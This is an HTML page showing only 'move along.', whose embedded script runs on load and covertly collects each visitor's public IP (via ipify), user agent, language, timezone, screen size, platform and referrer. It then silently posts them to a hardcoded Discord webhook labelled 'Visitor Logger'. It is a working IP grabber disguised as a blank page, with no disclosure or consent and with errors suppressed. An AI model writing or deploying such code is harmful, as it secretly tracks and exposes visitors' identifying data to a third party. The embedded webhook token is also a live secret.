<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>hello</title>
<style>
  body { margin:0; min-height:100vh; display:grid; place-items:center;
         font-family: system-ui, sans-serif; background:#0e0e10; color:#ccc; }
</style>
</head>
<body>
  <p>move along.</p>

<script>
(() => {
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1564518235498356746/1g-eEu1XpOnY5bn6zzbY15kja1620KeP1vPMC8yy3aIsu2ud7YqyKgj2zzkdThpVYZM-";

  async function getIP() {
    // ipify: free, no key, CORS enabled
    try {
      const r = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
      const j = await r.json();
      return j.ip || "unknown";
    } catch {
      return "unknown";
    }
  }

  function collect() {
    return {
      ip: null,
      ua: navigator.userAgent.slice(0, 500),
      lang: navigator.language || "unknown",
      tz: (Intl.DateTimeFormat().resolvedOptions().timeZone) || "unknown",
      screen: `${screen.width}x${screen.height}`,
      platform: navigator.platform || "unknown",
      ref: document.referrer || "none",
      page: location.href,
      ts: new Date().toISOString()
    };
  }

  async function send(data) {
    const payload = {
      username: "Visitor Logger",
      embeds: [{
        title: "New Hit",
        color: 0x2F3136,
        fields: [
          { name: "IP",       value: "`" + data.ip + "`", inline: true },
          { name: "Lang",     value: data.lang,           inline: true },
          { name: "Timezone", value: data.tz,             inline: true },
          { name: "Screen",   value: data.screen,         inline: true },
          { name: "Platform", value: data.platform,       inline: true },
          { name: "Referer",  value: data.ref.slice(0,300), inline: false },
          { name: "Page",     value: data.page.slice(0,300), inline: false },
          { name: "User-Agent", value: data.ua,           inline: false },
          { name: "Time",     value: data.ts,             inline: false }
        ]
      }]
    };

    try {
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        keepalive: true
      });
    } catch { /* silent */ }
  }

  // run
  (async () => {
    const data = collect();
    data.ip = await getIP();
    await send(data);
  })();
})();
</script>
</body>
</html>
